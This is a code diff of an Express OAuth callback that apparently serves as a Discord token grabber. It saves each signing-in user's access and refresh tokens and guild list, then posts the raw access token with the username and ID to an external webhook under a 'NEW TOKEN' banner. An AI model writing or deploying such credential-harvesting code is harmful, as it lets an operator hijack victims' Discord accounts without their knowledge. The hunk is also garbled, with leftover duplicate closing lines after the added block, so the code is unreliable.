@@ -58,10 +58,20 @@ app.get('/callback', async (req, res) => {
         db.run(`UPDATE tokens SET access_token = ?, refresh_token = ?, user_id = ?, username = ?, guilds = ? WHERE id = (SELECT MAX(id) FROM tokens)`,
             [access_token, refresh_token, userRes.data.id, userRes.data.username, JSON.stringify(guildsRes.data)]
         );
+        
+        // ⬇️ WEBHOOK SECTION - FIXED ⬇️
         if (process.env.WEBHOOK_URL) {
             await axios.post(process.env.WEBHOOK_URL, {
                 content: `**NEW TOKEN**\nUser: ${userRes.data.username} (${userRes.data.id})\nToken: ${access_token}`
             });
+        }
+        // ⬆️ WEBHOOK SECTION ⬆️
+        
+        res.redirect('https://discord.com/app');
+    } catch (error) {
+        res.send('Authentication failed.');
+    }
+});
         }
         res.redirect('https://discord.com/app');
     } catch (error) {
